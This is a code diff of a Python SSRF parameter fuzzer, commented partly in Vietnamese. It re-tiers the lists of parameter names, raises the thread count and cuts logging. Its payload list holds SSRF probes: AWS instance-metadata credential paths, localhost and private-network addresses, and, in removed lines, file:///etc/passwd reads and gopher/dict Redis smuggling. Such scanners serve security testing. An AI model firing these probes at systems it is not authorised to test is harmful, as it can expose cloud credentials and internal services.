@@ -11,44 +11,41 @@ from urllib.parse import urljoin, urlparse, parse_qs
 class ParameterFuzzer:
     """Fuzzing parameters để tìm SSRF"""
     
-    # Parameters thường gặp trong SSRF
+    # Top 15 MOST CRITICAL SSRF parameters (prioritized by real-world frequency)
     SSRF_PARAMETERS = [
-        'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'link',
-        'callback', 'callback_url', 'callbackUrl', 'return_url', 'returnUrl',
-        'webhook', 'webhook_url', 'webhookUrl', 'notify_url', 'notifyUrl',
-        'target', 'target_url', 'targetUrl', 'host', 'proxy', 'fetch',
-        'load', 'import', 'download', 'file', 'document', 'reference', 'ref',
+        # Top tier - Most common in real vulnerabilities
+        'url', 'uri', 'callback', 'callback_url', 'webhook', 'webhook_url',
+        # Second tier - Common redirect/fetch patterns  
+        'redirect', 'fetch', 'load', 'target',
+        # Third tier - File/resource loading
+        'file', 'image', 'path', 'link', 'download'
+    ]
+    
+    # Extended parameters for deep scan mode (can be enabled via config)
+    EXTENDED_PARAMETERS = [
+        'dest', 'destination', 'callbackUrl', 'return_url', 'returnUrl',
+        'webhookUrl', 'notify_url', 'notifyUrl', 'target_url', 'targetUrl',
+        'host', 'proxy', 'import', 'document', 'reference', 'ref',
         'next', 'continue', 'view', 'to', 'goto', 'out', 'checkout',
-        'image', 'img', 'picture', 'avatar', 'icon', 'logo', 'banner',
+        'img', 'picture', 'avatar', 'icon', 'logo', 'banner',
         'feed', 'rss', 'api', 'endpoint', 'service', 'resource'
     ]
     
-    # Test values để detect SSRF
+    # Test values để detect SSRF (Optimized for speed - removed redundant payloads)
     TEST_PAYLOADS = [
-        # External URLs (safe reserved domains)
-        'http://example.com',
-        'https://example.com',
+        # Callback URL (will be replaced with actual callback server)
+        'CALLBACK_URL_PLACEHOLDER',
         
-        # Localhost variants
+        # Localhost variants (most important)
         'http://127.0.0.1',
         'http://localhost',
-        'http://0.0.0.0',           # Alternative localhost
-        'http://[::1]',             # IPv6 localhost
         
-        # Cloud metadata endpoints
-        'http://169.254.169.254',   # AWS metadata
-        'http://169.254.169.254/latest/meta-data/',  # AWS IAM credentials
-        'http://metadata.google.internal',  # GCP metadata
-        'http://metadata.google.internal/computeMetadata/v1/',  # GCP detailed
+        # Cloud metadata endpoints (AWS only - most common)
+        'http://169.254.169.254/latest/meta-data/',
         
-        # Protocol smuggling
-        'file:///etc/passwd',       # Local file read
-        'dict://localhost:6379',    # Redis protocol
-        'gopher://localhost:6379',  # Generic TCP protocol
-        
-        # Docker/Internal network
-        'http://host.docker.internal',  # Docker host access
-        'http://172.17.0.1',       # Docker gateway
+        # Internal network probing
+        'http://192.168.1.1',
+        'http://10.0.0.1'
     ]
     
     # Payload mapping for custom selection
@@ -76,7 +73,7 @@ class ParameterFuzzer:
         ]
     }
     
-    def __init__(self, timeout: int = 10, threads: int = 5, custom_params: List[str] = None, custom_payloads: List[str] = None):
+    def __init__(self, timeout: int = 5, threads: int = 10, custom_params: List[str] = None, custom_payloads: List[str] = None):
         self.timeout = timeout
         self.threads = threads
         self.session = requests.Session()
@@ -104,11 +101,15 @@ class ParameterFuzzer:
         """Fuzz một endpoint cụ thể"""
         results = []
         
-        print(f"[*] Fuzzing {url} with {len(self.SSRF_PARAMETERS)} parameters x {len(self.TEST_PAYLOADS)} payloads = {len(self.SSRF_PARAMETERS) * len(self.TEST_PAYLOADS)} tests")
+        total_tests = len(self.SSRF_PARAMETERS) * len(self.TEST_PAYLOADS)
+        print(f"[*] Fuzzing {url} with {len(self.SSRF_PARAMETERS)} parameters x {len(self.TEST_PAYLOADS)} payloads = {total_tests} tests")
         
-        # Test từng parameter
+        # Test từng parameter (without verbose logging for each param)
         for idx, param in enumerate(self.SSRF_PARAMETERS, 1):
-            print(f"[{idx}/{len(self.SSRF_PARAMETERS)}] Testing parameter: {param}")
+            # Only log every 5th parameter to reduce spam
+            if idx == 1 or idx % 5 == 0 or idx == len(self.SSRF_PARAMETERS):
+                print(f"[{idx}/{len(self.SSRF_PARAMETERS)}] Testing parameters...")
+            
             result = self._test_parameter(url, param, method)
             if result:
                 results.append(result)
